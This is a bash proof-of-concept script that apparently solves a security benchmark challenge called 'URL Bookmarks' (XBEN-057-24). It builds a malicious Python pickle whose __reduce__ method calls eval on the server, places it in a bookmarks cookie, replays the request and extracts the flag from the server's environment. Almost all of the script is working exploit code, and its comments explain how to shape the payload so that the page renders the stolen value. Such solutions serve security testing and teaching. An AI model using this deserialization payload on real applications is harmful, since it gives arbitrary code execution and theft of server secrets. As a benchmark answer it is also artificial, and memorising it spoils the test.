#!/usr/bin/env bash
# XBEN-057-24 — "URL Bookmarks" (tags: insecure_deserialization)
#
# The bookmark list lives in a base64 pickle in a cookie, and the app unpickles
# it on every page load. Unpickling calls whatever the payload names, so the
# object the page renders can be anything at all.
#
# The interesting detail is what the payload has to *return*. The template reads
# `item.name` off each element, so a payload that returns the flag as a plain
# string renders nothing: iterating a string yields characters and characters
# have no `.name`. Returning one object with a `name` attribute puts the flag on
# the page. Matching the shape the sink expects is most of the work in a
# deserialization bug.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben057-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# Protocol 0 keeps the pickle ASCII so it survives an argument list.
BOOKMARKS="$(python3 -c "
import pickle, base64
class Evil:
    def __reduce__(self):
        # One object with the attributes the template reads, carrying the flag
        # out of the server's environment.
        return (eval, (\"[type('X',(),{'name':__import__('os').environ['FLAG'],'url':'#'})()]\",))
print(base64.b64encode(pickle.dumps(Evil(), protocol=0)).decode())")"

"$H5I" browser open "$URL/list" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 \
    --set "cookie.bookmarks=$BOOKMARKS" --set "cookie.user=poc" --create \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
